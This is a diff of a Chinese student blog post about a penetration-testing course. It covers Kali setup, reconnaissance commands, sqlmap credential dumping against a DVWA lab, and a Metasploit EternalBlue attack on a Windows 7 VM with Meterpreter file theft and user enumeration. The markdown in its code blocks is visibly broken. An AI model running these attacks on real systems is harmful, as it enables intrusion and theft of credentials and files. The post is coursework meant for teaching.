@@ -195,7 +195,7 @@
 
             <!-- Post Main Content -->
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-                <p>现在的我还处于一个对未来比较迷茫的阶段，并没有想好以后要从事哪个方向，再加上对小学期的感兴趣，十分不经思考的给自己把三个小学期都报上了，开启了每天早八晚九，十一点半还在写报告的日子。但是我认为既然我花了时间，我就不能白学，为了不挂科而编一个报告就算结束，于是就有了这篇博客。（三个小学期的项目每个都会有博客，只是渗透测试是第一个结束的，所以这个博客先出来）</p>
+                <p>现在的我还处于一个对未来比较迷茫的阶段，并没有想好以后要从事哪个方向，再加上对小学期的感兴趣，十分不经思考的给自己把三个小学期都报上了（开源软件，web前端，渗透测试），开启了每天早八晚九，十一点半还在写报告的日子。但是我认为既然我花了时间，我就不能白学，为了不挂科而编一个报告就算结束，于是就有了这篇博客。（三个小学期的项目每个都会有博客，只是渗透测试是第一个结束的，所以这个博客先出来）</p>
 <h1 id="一、渗透测试概述"><a href="#一、渗透测试概述" class="headerlink" title="一、渗透测试概述"></a>一、渗透测试概述</h1><h2 id="1-1-什么是渗透测试？"><a href="#1-1-什么是渗透测试？" class="headerlink" title="1.1 什么是渗透测试？"></a>1.1 什么是渗透测试？</h2><p>渗透测试是一种授权的、模拟黑客攻击的安全评估方法，通过主动探测系统漏洞来评估网络防御能力。与恶意攻击的本质区别在于，渗透测试是在授权和合规的前提下进行的。</p>
 <h2 id="1-2-渗透测试的目的"><a href="#1-2-渗透测试的目的" class="headerlink" title="1.2 渗透测试的目的"></a>1.2 渗透测试的目的</h2><ul>
 <li>发现系统潜在漏洞</li>
@@ -242,120 +242,159 @@
 <li>John the Ripper：密码破解工具</li>
 <li>Hashcat：高性能密码破解</li>
 </ul>
-<h1 id="四、渗透测试实战技巧-我会以我们这次三个靶机为例子"><a href="#四、渗透测试实战技巧-我会以我们这次三个靶机为例子" class="headerlink" title="四、渗透测试实战技巧(我会以我们这次三个靶机为例子)"></a>四、渗透测试实战技巧(我会以我们这次三个靶机为例子)</h1><h2 id="4-1-Kali-Linux-基础环境配置实验（在渗透测试前，首先需要完成-Kali-Linux-的基础环境配置。"><a href="#4-1-Kali-Linux-基础环境配置实验（在渗透测试前，首先需要完成-Kali-Linux-的基础环境配置。" class="headerlink" title="4.1 Kali Linux 基础环境配置实验（在渗透测试前，首先需要完成 Kali Linux 的基础环境配置。"></a>4.1 Kali Linux 基础环境配置实验（在渗透测试前，首先需要完成 Kali Linux 的基础环境配置。</h2><ul>
-<li><p>配置网络</p>
-</li>
-<li><ul>
-<li>确认虚拟网络环境</li>
+<h1 id="四、渗透测试实战技巧-我会以我们这次三个靶机为例子"><a href="#四、渗透测试实战技巧-我会以我们这次三个靶机为例子" class="headerlink" title="四、渗透测试实战技巧(我会以我们这次三个靶机为例子)"></a>四、渗透测试实战技巧(我会以我们这次三个靶机为例子)</h1><h2 id="4-1-Kali-Linux-基础环境配置实验（在渗透测试前，首先需要完成-Kali-Linux-的基础环境配置。"><a href="#4-1-Kali-Linux-基础环境配置实验（在渗透测试前，首先需要完成-Kali-Linux-的基础环境配置。" class="headerlink" title="4.1 Kali Linux 基础环境配置实验（在渗透测试前，首先需要完成 Kali Linux 的基础环境配置。"></a>4.1 Kali Linux 基础环境配置实验（在渗透测试前，首先需要完成 Kali Linux 的基础环境配置。</h2><h3 id="配置网络"><a href="#配置网络" class="headerlink" title="- 配置网络"></a>- 配置网络</h3><h4 id="确认虚拟网络环境"><a href="#确认虚拟网络环境" class="headerlink" title="- 确认虚拟网络环境"></a>- 确认虚拟网络环境</h4><h5 id="选择虚拟机网络适配器为“NAT模式”，默认连接至VMnet8。"><a href="#选择虚拟机网络适配器为“NAT模式”，默认连接至VMnet8。" class="headerlink" title="- 选择虚拟机网络适配器为“NAT模式”，默认连接至VMnet8。"></a>- 选择虚拟机网络适配器为“NAT模式”，默认连接至VMnet8。</h5><h4 id="配置虚拟机IP地址"><a href="#配置虚拟机IP地址" class="headerlink" title="- 配置虚拟机IP地址"></a>- 配置虚拟机IP地址</h4><h5 id="通过修改网络配置文件-etc-network-interfaces"><a href="#通过修改网络配置文件-etc-network-interfaces" class="headerlink" title="- 通过修改网络配置文件 &#x2F;etc&#x2F;network&#x2F;interfaces"></a>- 通过修改网络配置文件 &#x2F;etc&#x2F;network&#x2F;interfaces</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/network/interfaces</span><br></pre></td></tr></table></figure>
+<h5 id="配置静态-NAT-网络"><a href="#配置静态-NAT-网络" class="headerlink" title="- 配置静态 NAT 网络"></a>- 配置静态 NAT 网络</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.40.130  //&lt;ip地址&gt;</span><br><span class="line">netmask 255.255.255.0  //&lt;子网掩码&gt;</span><br><span class="line">gateway 192.168.40.1  //&lt;网关IP&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="保存后重启网络服务："><a href="#保存后重启网络服务：" class="headerlink" title="- 保存后重启网络服务："></a>- 保存后重启网络服务：</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> service networking restart </span><br></pre></td></tr></table></figure>
+
+<h4 id="验证NAT网络连通性"><a href="#验证NAT网络连通性" class="headerlink" title="- 验证NAT网络连通性"></a>- 验证NAT网络连通性</h4><h5 id="使用-ifconfig-查看IP配置是否生效"><a href="#使用-ifconfig-查看IP配置是否生效" class="headerlink" title="- 使用  ifconfig  查看IP配置是否生效"></a>- 使用  ifconfig  查看IP配置是否生效</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig </span><br></pre></td></tr></table></figure>
+<h5 id="通过修DNS络配置文件-etc-resolv-conf"><a href="#通过修DNS络配置文件-etc-resolv-conf" class="headerlink" title="- 通过修DNS络配置文件 &#x2F;etc&#x2F;resolv.conf"></a>- 通过修DNS络配置文件 &#x2F;etc&#x2F;resolv.conf</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vim /etc/resolv.conf </span><br></pre></td></tr></table></figure>
+<h5 id="DNS服务器配置"><a href="#DNS服务器配置" class="headerlink" title="- DNS服务器配置"></a>- DNS服务器配置</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> nameserver 192.168.40.1  //&lt;网关IP&gt;</span><br><span class="line">nameserver 10.145.214.107  //（这个是学校的）</span><br><span class="line"> nameserver 114.114.114.114  //（这个是国家的）</span><br></pre></td></tr></table></figure>
+<h5 id="保存后重启网络服务"><a href="#保存后重启网络服务" class="headerlink" title="- 保存后重启网络服务"></a>- 保存后重启网络服务</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service networking restart  </span><br></pre></td></tr></table></figure>
+<h5 id="ping-网址，确认虚拟机可通过NAT模式访问互联网。"><a href="#ping-网址，确认虚拟机可通过NAT模式访问互联网。" class="headerlink" title="- ping 网址，确认虚拟机可通过NAT模式访问互联网。"></a>- ping 网址，确认虚拟机可通过NAT模式访问互联网。</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping www.baidu.com </span><br></pre></td></tr></table></figure>
+<h3 id="配置软件源"><a href="#配置软件源" class="headerlink" title="- 配置软件源"></a>- 配置软件源</h3><h4 id="通过修改软件源配置文件-etc-apt-sources-list"><a href="#通过修改软件源配置文件-etc-apt-sources-list" class="headerlink" title="- 通过修改软件源配置文件 &#x2F;etc&#x2F;apt&#x2F;sources.list"></a>- 通过修改软件源配置文件 &#x2F;etc&#x2F;apt&#x2F;sources.list</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list </span><br></pre></td></tr></table></figure>
+<h4 id="编辑软件源配置文件（我的和ppt上的不完全一样，我的电脑无法连接阿里云镜像源服务器，试过再次更改网络配置发现依旧链接不上-所以直接把阿里云镜像源服务器给注释掉了）"><a href="#编辑软件源配置文件（我的和ppt上的不完全一样，我的电脑无法连接阿里云镜像源服务器，试过再次更改网络配置发现依旧链接不上-所以直接把阿里云镜像源服务器给注释掉了）" class="headerlink" title="- 编辑软件源配置文件（我的和ppt上的不完全一样，我的电脑无法连接阿里云镜像源服务器，试过再次更改网络配置发现依旧链接不上 所以直接把阿里云镜像源服务器给注释掉了）"></a>- 编辑软件源配置文件（我的和ppt上的不完全一样，我的电脑无法连接阿里云镜像源服务器，试过再次更改网络配置发现依旧链接不上 所以直接把阿里云镜像源服务器给注释掉了）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list </span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#中科大</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib </span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib </span><br><span class="line"><span class="comment">#阿里云 </span></span><br><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib </span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib </span><br><span class="line"><span class="comment">#清华大学 </span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free </span><br><span class="line"><span class="comment">#腾讯 </span></span><br><span class="line">deb http://mirrors.tencent.com/kali/ kali-rolling main contrib non-free </span><br><span class="line">deb-src http://mirrors.tencent.com/kali/ kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure>
+<h4 id="更新软件源索引"><a href="#更新软件源索引" class="headerlink" title="- 更新软件源索引"></a>- 更新软件源索引</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>
+<h3 id="更新kali系统"><a href="#更新kali系统" class="headerlink" title="- 更新kali系统"></a>- 更新kali系统</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get upgrade</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">```bash</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"><span class="comment">## 4.2 信息收集实验  （渗透测试的核心前期工作，通过多维度获取目标系统信息。）  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">### - 发现主机  </span></span><br><span class="line"><span class="comment">#### - IP地址规则  </span></span><br><span class="line">- 工具：`netmask`  </span><br><span class="line">- 功能：计算IP范围对应的子网掩码格式。  </span><br><span class="line">- 命令示例：  </span><br><span class="line">  ```bash</span><br><span class="line">  netmask 192.168.137.0-192.168.137.255  <span class="comment"># 输出掩码：255.255.255.0</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"><span class="comment">#### - 确定网络拓扑  </span></span><br><span class="line">- 工具：`traceroute`  </span><br><span class="line">- 功能：探测网络路径，区分外网/局域网环境。  </span><br><span class="line">- 命令示例：  </span><br><span class="line">  ```bash</span><br><span class="line">  traceroute www.baidu.com  <span class="comment"># 查看公网路由</span></span><br><span class="line">  traceroute 192.168.1.1    <span class="comment"># 查看局域网路由</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### - 扫描主机  </span></span><br><span class="line"><span class="comment">#### - Nmap工具  </span></span><br><span class="line">- 探测存活主机：  </span><br><span class="line">  ```bash</span><br><span class="line">  nmap -sP 192.168.1.0/24  <span class="comment"># 扫描网段内存活主机</span></span><br><span class="line">  ```  </span><br><span class="line">- 端口扫描：  </span><br><span class="line">  ```bash</span><br><span class="line">  nmap -p 1-65535 192.168.1.100  <span class="comment"># 全端口扫描</span></span><br><span class="line">  nmap -F 192.168.1.100  <span class="comment"># 快速扫描前100个端口</span></span><br><span class="line">  ```  </span><br><span class="line">- 操作系统探测：  </span><br><span class="line">  ```bash</span><br><span class="line">  nmap -O 192.168.1.100  <span class="comment"># 识别目标操作系统类型</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"><span class="comment">#### - Netdiscover工具（ARP主动扫描）  </span></span><br><span class="line">- 命令示例：  </span><br><span class="line">  ```bash</span><br><span class="line">  netdiscover -i eth0 -r 192.168.1.0/24  <span class="comment"># 指定网卡和扫描范围</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### - 监听发现主机  </span></span><br><span class="line"><span class="comment">#### - Netdiscover被动模式（ARP监听）  </span></span><br><span class="line">- 命令示例：  </span><br><span class="line">  ```bash</span><br><span class="line">  netdiscover -i eth0 -p  <span class="comment"># -p参数启用被动监听模式</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"><span class="comment">#### - DHCP监听  </span></span><br><span class="line">- 工具：`dhcpdump` 或抓包工具（如Wireshark）  </span><br><span class="line">- 功能：捕获DHCP协议包，获取新上线设备的IP分配信息。  </span><br><span class="line">- 命令示例（Wireshark过滤DHCP）：  </span><br><span class="line">  ```bash</span><br><span class="line">  <span class="comment"># 在Wireshark中设置过滤规则</span></span><br><span class="line">  dhcp  <span class="comment"># 仅显示DHCP相关数据包</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### - 域名信息分析  </span></span><br><span class="line"><span class="comment">#### - whois工具  </span></span><br><span class="line">- 功能：查询域名注册信息、所有者、过期时间等。  </span><br><span class="line">- 命令示例：  </span><br><span class="line">  ```bash</span><br><span class="line">  whois baidu.com  <span class="comment"># 查询百度域名信息</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"><span class="comment">#### - dmitry工具（子域名查询）  </span></span><br><span class="line">- 依赖：需VPN访问境外域名服务器。  </span><br><span class="line">- 命令示例：  </span><br><span class="line">  ```bash</span><br><span class="line">  dmitry -w baidu.com  <span class="comment"># -w参数扫描子域名</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"><span class="comment">#### - nslookup工具（域名解析）  </span></span><br><span class="line">- 功能：将域名转换为IP地址，或反向查询。  </span><br><span class="line">- 命令示例：  </span><br><span class="line">  ```bash</span><br><span class="line">  nslookup baidu.com  <span class="comment"># 正向解析</span></span><br><span class="line">  nslookup 14.215.177.38  <span class="comment"># 反向解析IP对应的域名</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"><span class="comment">#### - ping命令（域名探测）  </span></span><br><span class="line">- 功能：测试域名连通性，获取响应时间和TTL值。  </span><br><span class="line">- 命令示例：  </span><br><span class="line">  ```bash</span><br><span class="line">  ping baidu.com  <span class="comment"># 探测域名是否可达</span></span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### - 扫描端口  </span></span><br><span class="line"><span class="comment">#### - 端口基础认知  </span></span><br><span class="line">- 分类：  </span><br><span class="line">  - 知名端口（0-1023）：如80（HTTP）、443（HTTPS）、22（SSH）。  </span><br><span class="line">  - 注册端口（1024-49151）：如3389（RDP）、1433（SQL Server）。  </span><br><span class="line">  - 动态端口（49152-65535）：临时分配给客户端程序。  </span><br><span class="line">- 用途示例：  </span><br><span class="line">  - 80端口开放 → 目标可能运行Web服务；  </span><br><span class="line">  - 22端口开放 → 可能允许SSH远程登录。  </span><br><span class="line"></span><br><span class="line"><span class="comment">#### - nmap端口扫描实战  </span></span><br><span class="line">- 全端口扫描：  </span><br><span class="line">  ```bash</span><br><span class="line">  nmap -p 1-65535</span><br></pre></td></tr></table></figure>
+<ul>
+<li>快速扫描： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -F &lt;IP&gt; 仅扫描前100个常用端口，适用于初步探测。</span><br></pre></td></tr></table></figure></li>
 </ul>
+<h2 id="4-3-Metasploitable靶机攻击实验"><a href="#4-3-Metasploitable靶机攻击实验" class="headerlink" title="4.3  Metasploitable靶机攻击实验"></a>4.3  Metasploitable靶机攻击实验</h2><h3 id="1、实验方法与步骤："><a href="#1、实验方法与步骤：" class="headerlink" title="1、实验方法与步骤："></a>1、实验方法与步骤：</h3><h4 id="网络环境探测"><a href="#网络环境探测" class="headerlink" title="- 网络环境探测"></a>- 网络环境探测</h4><ul>
+<li><p>通过 <code>ifconfig</code> 查看本地IP地址  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">  ifconfig  <span class="comment"># 查找eth0或enp0s3等网卡的IP</span></span><br><span class="line">  ```  </span><br><span class="line">- 使用 `nmap` 扫描同一网段存活主机  </span><br><span class="line">  ```bash</span><br><span class="line">  nmap -sP 192.168.40.0/24  <span class="comment"># 扫描网段（替换为实际网段）</span></span><br><span class="line">  ```  </span><br><span class="line">- 访问扫描到的IP，定位靶机（如DVWA平台）  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#### - 漏洞利用准备  </span></span><br><span class="line">- 目标漏洞：DVWA平台存在SQL注入、命令执行等漏洞  </span><br><span class="line">- 工具：`sqlmap`、浏览器开发者工具（抓包Cookies）  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#### - 漏洞探测与利用  </span></span><br><span class="line">1. **捕获Cookies**  </span><br><span class="line">   - 通过浏览器访问DVWA，打开开发者工具（F12）→ `Network` 标签，获取登录后的Cookies值。  </span><br><span class="line"></span><br><span class="line">2. **SQL注入点探测**  </span><br><span class="line">   - 访问DVWA的`SQL Injection`模块，尝试在输入框中输入 `<span class="string">&#x27;` 或 `1&#x27;</span> AND 1=1--`，观察页面返回是否异常。  </span><br><span class="line"></span><br><span class="line">3. **数据库渗透（sqlmap工具）**  </span><br><span class="line">   - 探测数据库类型：  </span><br><span class="line">     ```bash</span><br><span class="line">     sqlmap -u <span class="string">&quot;http://靶机IP/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span> --cookie=<span class="string">&quot;获取的Cookies&quot;</span> -dbs</span><br><span class="line">     ```  </span><br><span class="line">   - 枚举表名（指定数据库为dvwa）：  </span><br><span class="line">     ```bash</span><br><span class="line">     sqlmap -u <span class="string">&quot;http://靶机IP/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span> --cookie=<span class="string">&quot;获取的Cookies&quot;</span> -D dvwa --tables</span><br><span class="line">     ```  </span><br><span class="line">   - 提取字段（指定表为<span class="built_in">users</span>）：  </span><br><span class="line">     ```bash</span><br><span class="line">     sqlmap -u <span class="string">&quot;http://靶机IP/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span> --cookie=<span class="string">&quot;获取的Cookies&quot;</span> -D dvwa -T <span class="built_in">users</span> --columns</span><br><span class="line">     ```  </span><br><span class="line">   - 导出数据（提取user和password字段）：  </span><br><span class="line">     ```bash</span><br><span class="line">     sqlmap -u <span class="string">&quot;http://靶机IP/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span> --cookie=<span class="string">&quot;获取的Cookies&quot;</span> -D dvwa -T <span class="built_in">users</span> -C user,password --dump</span><br><span class="line">     ```  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#### - 实验结果  </span></span><br><span class="line">- 成功获取DVWA平台的用户凭据（user/password），例如：  </span><br></pre></td></tr></table></figure>
+<p>user: admin<br>password: password  # 或其他弱密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">### 2、实验注意事项  </span><br><span class="line">- DVWA需设置为`Low`安全级别以触发漏洞；  </span><br><span class="line">- 操作需在授权环境下进行，禁止对未授权目标测试；  </span><br><span class="line">- `sqlmap`命令需根据实际URL和Cookies值调整参数。</span><br><span class="line">- 代理隧道建立（Proxychains、EarthWorm）</span><br><span class="line">- 域渗透基础（Kerberos攻击、域控利用）</span><br><span class="line">- 横向移动技术</span><br><span class="line"></span><br><span class="line">## 4.4 永恒之蓝漏洞攻击实验  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 1、实验方法与步骤：  </span><br><span class="line">#### - 网络环境探测  </span><br><span class="line">- 通过 `ifconfig` 查看本地IP地址  </span><br><span class="line">  ```bash</span><br><span class="line">  ifconfig  # 查找eth0或enp0s3等网卡的IP（例：192.168.40.130）</span><br><span class="line">  ```  </span><br><span class="line">- 使用 `nmap` 扫描同一网段存活主机及端口  </span><br><span class="line">  ```bash</span><br><span class="line">  nmap -sS -p 445 192.168.40.0/24  # 扫描445端口（替换为实际网段）</span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### - 漏洞探测  </span><br><span class="line">- 确认目标主机（Win7）的445端口状态  </span><br><span class="line">  - 若扫描结果显示 `445/tcp open`，表明存在永恒之蓝漏洞攻击面。  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### - 漏洞利用（Metasploit框架）  </span><br><span class="line">1. 启动MSF控制台  </span><br><span class="line">  ```bash</span><br><span class="line">  msfconsole  # 进入Metasploit交互界面</span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line">2. 搜索永恒之蓝漏洞模块  </span><br><span class="line">  ```bash</span><br><span class="line">  search ms17_010  # 查找永恒之蓝相关攻击模块</span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line">3. 选择攻击模块并配置参数  </span><br><span class="line">  ```bash</span><br><span class="line">  use exploit/windows/smb/ms17_010_eternalblue  # 选择永恒之蓝攻击模块</span><br><span class="line">  set RHOSTS 192.168.40.100  # 设置目标IP（替换为实际靶机IP）</span><br><span class="line">  set LHOST 192.168.40.130  # 设置本地IP（攻击机IP）</span><br><span class="line">  exploit  # 执行攻击</span><br><span class="line">  ```  </span><br><span class="line"></span><br><span class="line">4. 获取Meterpreter会话后执行后续操作  </span><br><span class="line">  - 截图：  </span><br><span class="line">    ```bash</span><br><span class="line">    screenshot  # 捕获目标主机屏幕</span><br><span class="line">    ```  </span><br><span class="line">  - 上传/下载文件：  </span><br><span class="line">    ```bash</span><br><span class="line">    upload /本地文件路径 目标路径  # 上传文件到目标主机</span><br><span class="line">    download 目标文件路径 /本地保存路径  # 从目标主机下载文件</span><br><span class="line">    ```  </span><br><span class="line">  - 获取系统信息：  </span><br><span class="line">    ```bash</span><br><span class="line">    sysinfo  # 查看目标主机系统版本、架构等信息</span><br><span class="line">    ```  </span><br><span class="line">  - 枚举用户：  </span><br><span class="line">    ```bash</span><br><span class="line">    run post/windows/gather/enum_users  # 枚举目标主机用户</span><br><span class="line">    ```  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 2、实验结果分析  </span><br><span class="line">- **漏洞利用成功标志**：  </span><br><span class="line">  - MSF控制台返回 `Meterpreter session opened`，表明成功获取目标主机控制权限。  </span><br><span class="line">  - 通过 `sysinfo` 命令确认目标系统为 `Windows 7 Professional SP1 x64`，未安装MS17-010漏洞补丁。  </span><br><span class="line"></span><br><span class="line">- **获取的关键信息**：  </span><br><span class="line">  - 目标主机IP：`192.168.40.100`，开放445端口（SMB服务）。  </span><br><span class="line">  - 系统用户列表（通过 `enum_users` 模块）：  </span><br></pre></td></tr></table></figure>
+<p>  Administrator (S-1-5-21-…-500)<br>  Guest (S-1-5-21-…-501)<br>  user01 (S-1-5-21-…-1001)</p>
+<pre><code>- 敏感文件示例（通过文件浏览功能）：  
+- `C:\Users\user01\Desktop\password.txt` 包含弱密码 `P@ssw0rd123`。  
+</code></pre>
 </li>
-<li><ul>
-<li><ul>
-<li>选择虚拟机网络适配器为“NAT模式”，默认连接至VMnet8。</li>
